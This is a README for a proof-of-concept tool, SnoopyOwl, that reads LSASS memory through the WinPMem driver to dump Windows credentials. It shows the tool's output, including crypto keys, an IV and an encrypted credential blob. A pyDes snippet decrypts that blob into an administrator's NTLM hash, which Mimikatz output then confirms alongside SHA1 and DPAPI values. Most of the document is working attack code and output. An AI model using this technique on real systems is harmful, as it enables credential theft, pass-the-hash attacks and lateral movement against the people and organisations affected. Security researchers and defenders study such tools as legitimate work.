# SnoopyOwl (Proof of Concept)

# Example:
Load WinPMem (`winpmem -l`) and execute SnoopyOwl (remember to change the hardcoded PID):
```
(...)
[!] LsaSrv.dll found! [0x7ff845130000-0x7ff8452ce000] (1695744 bytes)
                ===================[Crypto info]===================
[*] Offset for InitializationVector/h3DesKey/hAesKey is 305033
[*] IV Vector relative offset: 0x0013be98
                [/!\] IV Vector: d2e23014c6608529132d0f21144ee0df [/!\]
[*] 3DES Handle Key relative offset: 0x0013bf4c
[*] 3DES Handle Key pointer: 0x1d4d3610000
                [/!\] 3DES Key: 46bca8b85491846f5c7fb42700287d0437c49c15e7b76280 [/!\]
                ================================================
[*] LogonSessionList Relative Offset: 0x0012b0f1
[*] LogonSessionList: 0x7ff8452b52a0
                ===================[LogonSessionList]===================
[+] Username: Administrador
[*] Credentials Pointer: 0x1d4d3ba96c0
[*] Primary credentials Pointer: 0x1d4d3ae49f0
[*] Cryptoblob size: 0x1b0
[+] Cryptoblob:
f0e368d8302af9bbcd247687552e8207d766e674c99a61907e78a173d5e4d475df165ec1fcba3b5d3463f8bd7ce5fa6457d043147dcf26a6e03ec12d1216d57953a7f4cbdcaeec2c6a27787c332db706a5287a77957d09d546590d7f32a117f69d983290c01b1ad83cf66916ee76314c17605518a17d7ea9db2de530b1298e5178fcc638e1ae106542dcb46e37a09943dd10e3e2f15a99b93989361aa3a6e6ed8e98aab5578712bcf0f9e5a5372542f61a9032bf5d110278253c4f602107a02bf2cfe07fae7f81a4dee6440a596278e7c06eee06de5aa7f705bd6132dea0327ad869eca5da1538e098edfefcd050dd6e36a0a3196cdf5ee6786d0b62a3d526981f6c4fc503d43238887cf6f3c51cca01b912194242d7e5a76522aaf791c467ea6035a06219ea2aafc2860e6db56ddb77936871316e3f18fd9b1425f948c925171829e460cf7c31f9a0396705bcb1bfd0055b25de160cf816472180270f36e9224868d1377349f7bb001e7edfe52dbd1915a70fb686f850086732c57ba26423f7a3691ddb9b23b5f2166a56ee82d30571ffb79b222e707f6dc2cc5f986723d99229345b2d0b97371abb1573f59efecd6a
```

The NTLM hash can be decrypted from the "cryptoblob" with the previous information:

```
>> from pyDes import *
>>> k = triple_des("46bca8b85491846f5c7fb42700287d0437c49c15e7b76280".decode("hex"), CBC, "\x00\x0d\x56\x99\x63\x93\x95\xd0")
>>> k.decrypt("f0e368d8302af9bbcd247687552e8207d766e674c99a61907e78a173d5e4d475df165ec1fcba3b5d3463f8bd7ce5fa6457d043147dcf26a6e03ec12d1216d57953a7f4cbdcaeec2c6a27787c332db706a5287a77957d09d546590d7f32a117f69d983290c01b1ad83cf66916ee76314c17605518a17d7ea9db2de530b1298e5178fcc638e1ae106542dcb46e37a09943dd10e3e2f15a99b93989361aa3a6e6ed8e98aab5578712bcf0f9e5a5372542f61a9032bf5d110278253c4f602107a02bf2cfe07fae7f81a4dee6440a596278e7c06eee06de5aa7f705bd6132dea0327ad869eca5da1538e098edfefcd050dd6e36a0a3196cdf5ee6786d0b62a3d526981f6c4fc503d43238887cf6f3c51cca01b912194242d7e5a76522aaf791c467ea6035a06219ea2aafc2860e6db56ddb77936871316e3f18fd9b1425f948c925171829e460cf7c31f9a0396705bcb1bfd0055b25de160cf816472180270f36e9224868d1377349f7bb001e7edfe52dbd1915a70fb686f850086732c57ba26423f7a3691ddb9b23b5f2166a56ee82d30571ffb79b222e707f6dc2cc5f986723d99229345b2d0b97371abb1573f59efecd6a".decode("hex"))[74:90].encode("hex")
'191d643eca7a6b94a3b6df1469ba2846'
```
This value can be confirmed with Mimikatz:

```
C:\Windows\system32>C:\Users\ortiga.japonesa\Downloads\mimikatz-master\mimikatz-master\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May  8 2021 00:30:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # sekurlsa::msv

Authentication Id : 0 ; 120327884 (00000000:072c0ecc)
Session           : CachedInteractive from 1
User Name         : Administrador
Domain            : ACUARIO
Logon Server      : WIN-UQ1FE7E6SES
Logon Time        : 08/05/2021 0:44:32
SID               : S-1-5-21-3039666266-3544201716-3988606543-500
        msv :
         [00000003] Primary
         * Username : Administrador
         * Domain   : ACUARIO
         * NTLM     : 191d643eca7a6b94a3b6df1469ba2846 <-----
         * SHA1     : 5f041d6e1d3d0b3f59d85fa7ff60a14ae1a5963d
         * DPAPI    : b4772e37b9a6a10785ea20641c59e5b2
```


